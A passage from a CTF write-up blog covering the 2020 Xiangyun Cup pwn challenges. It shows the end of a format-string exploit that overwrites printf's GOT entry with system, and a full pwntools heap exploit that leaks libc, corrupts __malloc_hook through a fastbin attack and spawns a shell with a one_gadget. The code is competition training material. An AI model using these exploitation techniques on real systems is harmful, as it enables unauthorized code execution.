class="hljs-string">b&#x27;\x00&#x27;</span>)<br>	p += p64(printf_got + <span class="hljs-number">2</span>)<br>	p += p64(printf_got + <span class="hljs-number">0</span>)<br>	sl(p)<br>	<span class="hljs-comment">#p =   b&#x27;%&#x27; + str(system &amp; 0xFFFF) + b&#x27;c%&#x27; + str(offset) + b&#x27;$hn&#x27;</span><br>	<span class="hljs-comment">#p = p.ljust(0x20,&#x27;A&#x27;)</span><br>	<span class="hljs-comment">#p = antitone_fmt_payload(6, &#123; printf_got : system &#125;, write_size=&#x27;short&#x27;)</span><br>	<span class="hljs-comment">#p = &#x27;%&#x27; +  str(system &amp; 0xFFFF) + </span><br><br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process()<br>	<span class="hljs-keyword">else</span>:<br>		<span class="hljs-comment">#elf = ELF(elf_path)</span><br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>





<h4 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h4><h5 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;pwn2&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>server_ip = <span class="hljs-string">&quot;172.20.2.11&quot;</span><br>server_port = <span class="hljs-number">25688</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>	<span class="hljs-keyword">if</span>(LOCAL):<br>		gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">idx, sz</span>):<br>	sla(<span class="hljs-string">&#x27;ce\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;ce\n&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">idx, d</span>):<br>	sla(<span class="hljs-string">&#x27;ce\n&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>	sa(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;ce\n&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br>	sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>		ad(i, <span class="hljs-number">0x10</span>)<br><br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>		rm(i)<br><br>	ad(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>)<br>	ad(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>)<br>	ad(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>	ad(<span class="hljs-number">3</span>, <span class="hljs-number">0x80</span>)<br>	ad(<span class="hljs-number">4</span>, <span class="hljs-number">0x68</span>)<br><br><br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x60</span><br>	p += p64(<span class="hljs-number">0x90</span> + <span class="hljs-number">0x70</span> + <span class="hljs-number">0x70</span>) + <span class="hljs-string">b&#x27;\x90&#x27;</span><br>	md(<span class="hljs-number">2</span>, p)<br>	rm(<span class="hljs-number">1</span>)<br>	rm(<span class="hljs-number">2</span>)<br>	rm(<span class="hljs-number">0</span>)<br>	rm(<span class="hljs-number">3</span>)<br><br>	ad(<span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>)<br>	dp(<span class="hljs-number">0</span>)<br>	leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>) - <span class="hljs-number">584</span> - <span class="hljs-number">0x10</span><br>	li(<span class="hljs-string">&#x27;leak &#x27;</span> + <span class="hljs-built_in">hex</span>(leak))<br><br>	lib = LibcSearcher(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>, leak)<br><br>	libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>	realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>	gadget = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>] <span class="hljs-comment"># libc.so.6</span><br>	<span class="hljs-comment">#gadget = [0x45206, 0x4525a, 0xef9f4, 0xf0897] # libc6_2.23-0ubuntu3_amd64</span><br>	<span class="hljs-comment">#gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] # libc6_2.23-0ubuntu10_amd64.so</span><br>	one_gadget = libc_base + gadget[<span class="hljs-number">1</span>]<br>	<span class="hljs-comment">#one_gadget = libc_base + libc.sym[&#x27;puts&#x27;]</span><br>	li(<span class="hljs-string">&#x27;libc_base &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>)<br>	p += p64(leak - <span class="hljs-number">0x23</span>)<br>	p += <span class="hljs-string">b&#x27;\n&#x27;</span><br>	ad(<span class="hljs-number">4</span>, <span class="hljs-number">0xa0</span>)<br>	md(<span class="hljs-number">4</span>, p)<br>	ad(<span class="hljs-number">5</span>, <span class="hljs-number">0x68</span>)<br><br>	p = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x13</span> - <span class="hljs-number">8</span>)<br>	p += p64(one_gadget)<br>	p += p64(realloc + <span class="hljs-number">2</span>)<br>	p += <span class="hljs-string">b&#x27;\n&#x27;</span><br>	ad(<span class="hljs-number">6</span>, <span class="hljs-number">0x68</span>)<br>	md(<span class="hljs-number">6</span>, p)<br>	<span class="hljs-comment">#db()</span><br>	li(<span class="hljs-string">&#x27;libc_base &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>	<span class="hljs-comment">#li(&#x27;libc: &#x27; + hex(lib.dump(&#x27;__malloc_hook&#x27;)))</span><br><br>	ad(<span class="hljs-number">7</span>, <span class="hljs-number">0x10</span>)<br>	<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		libc_path = <span class="hljs-string">&#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>		elf = ELF(elf_path)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>			io = elf.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )<br>		<span class="hljs-keyword">else</span>:<br>			io = elf.process()<br>	<span class="hljs-keyword">else</span>:<br>		elf = ELF(elf_path)<br>		libc_path = <span class="hljs-string">&#x27;./libc6_2.23-0ubuntu10_amd64.so&#x27;</span><br>		libc_path = <span class="hljs-string">&#x27;./libc6_2.23-0ubuntu3_amd64.so&#x27;</span><br>		libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>		io = remote(server_ip, server_port)<br>		<span class="hljs-keyword">if</span> LIBC:<br>			libc = ELF(libc_path)<br>	exploit()<br>	finish()<br><br></code></pre></td></tr></table></figure>

<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2020/11/28/env/linux/myarch/set_startup_script/">← Next archlinux设置自己的开机脚本</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2020/11/15/env/linux/issues/">issues Prev →</a></div></div></div><details id="reward"><summary>打赏点小钱</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A5%A5%E4%BA%91%E6%9D%AF-2020-WP"><span class="toc-text">祥云杯 2020 WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN1-Beauty-Of-ChangChun"><span class="toc-text">PWN1 [Beauty_Of_ChangChun]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vul"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN2-baby-dev"><span class="toc-text">PWN2[baby dev]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN3-baby-pwn"><span class="toc-text">PWN3[baby pwn]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN4-%E5%BC%95%E6%B5%81%E4%B9%8B%E4%B8%BB"><span class="toc-text">PWN4[引流之主]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN5-%E6%8A%8A%E5%98%B4%E9%97%AD%E4%B8%8A"><span class="toc-text">PWN5 [把嘴闭上]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0"><span class="toc-text">更新</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN6-garden"><span class="toc-text">PWN6[garden]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vul-1"><span class="toc-text">vul</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%A5%E4%BA%91%E6%80%BB%E5%86%B3%E8%B5%9Bpwn"><span class="toc-text">祥云总决赛pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%A8%A1%E5%BC%8F"><span class="toc-text">解题模式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn1"><span class="toc-text">pwn1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exp-5"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn2"><span class="toc-text">pwn2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exp-6"><span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">2022 by i0gan</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
 el: '#Valine'
 , appId: 'TzNey4n3v0Sx6vdBbytYLoH9-gzGzoHsz'
 , appKey: 'GIXXrK9zLxt0bZLww1hte0Oq' , placeholder: '此条评论委托企鹅物流发送'
});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>